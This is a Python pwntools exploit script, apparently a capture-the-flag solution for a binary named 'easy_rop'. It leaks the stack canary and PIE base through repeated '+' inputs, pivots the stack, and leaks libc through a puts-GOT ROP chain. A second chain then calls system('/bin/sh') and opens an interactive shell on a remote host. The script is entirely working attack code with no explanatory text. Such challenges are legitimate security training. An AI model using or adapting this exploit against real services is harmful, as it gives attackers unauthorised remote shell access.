from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
# p = process("./easy_rop")

libc=ELF("/libc64.so")
e = ELF("./easy_rop")
while True:
    # p = process("./easy_rop")
    # p = remote("139.129.76.65","50002")
    p = remote("192.168.230.130","6666")
    for i in range(26):
        p.recv()
        p.sendline('+')

    p.recv()
    p.sendline('+')
    p.recvuntil("26 = ")
    low = int(p.recvuntil("\n"))
    p.sendline('+')
    p.recvuntil("27 = ")
    high = int(p.recvuntil("\n"))

    canary = (high << 32) | low


    p.recv()
    p.sendline('+')
    p.recvuntil("28 = ")
    low = int(p.recvuntil("\n"))
    p.sendline('+')
    p.recvuntil("29 = ")
    high = int(p.recvuntil("\n"))

    if (low < 0 or canary < 0):
        p.close()
        continue
    print(hex(high), hex(low))
    print hex(high<<32)
    pie = (high << 32) | low
    pie -= 0xb40
    print hex(pie)
    print hex(canary)
    # pause()
    buf = pie +0x201420
    main = pie +0xa31
    print "back"
    #gdb.attach(p,"breakrva 0xb18")
    p.recv()
    p.sendline(str(main & 0xffffffff))
    p.recv()
    p.sendline(str((main >> 32) & 0xffffffff))
    #gdb.attach(p,"breakrva 0xb18")
    while str(p.recv()).find("name") == -1:
        p.sendline("+")

    p.sendline('+')

    # pause()
    print "step1"
    for i in range(28):
        p.recv()
        p.sendline('+')

    print "buf"
    p.recv()
    p.sendline(str(buf & 0xffffffff))
    p.recv()
    p.sendline(str((buf>>32) & 0xffffffff))

    print "set rsp"
    p.recv()
    rsp=(pie+0xB31)
    p.sendline(str(rsp & 0xffffffff))
    p.recv()
    p.sendline(str((rsp>>32) & 0xffffffff))

    print "back"
    p.recv()
    p.sendline(str(main & 0xffffffff))
    p.recv()
    p.sendline(str((main>>32) & 0xffffffff))
    
    # gdb.attach(p, "breakrva 0xb18")
    rop_chain = p64(buf+0x50)
    prdi=0x0000000000ba3+pie
    rop_chain += p64(prdi) + p64(pie + e.got['puts'])
    rop_chain += p64(pie + e.plt['puts']) + p64(pie+0xAFD)
    # gdb.attach(p, "breakrva 0xb18")
    print "gain libc"
    p.recvuntil("name")
    pause()
    p.sendline(rop_chain)
    p.recv()
    libc.address=u64(p.recv(6)+'\x00\x00')-libc.symbols['puts']
    print hex(libc.address)

    p.recv()
    print "get shell"
    rop_chain = p64(canary)*4+p64(prdi) + p64(next(libc.search("/bin/sh"))) + p64(libc.symbols['system'])
    p.sendline(rop_chain)
    p.interactive()
    break


# socat tcp-l:6666,fork exec:./easy_rop,reuseaddr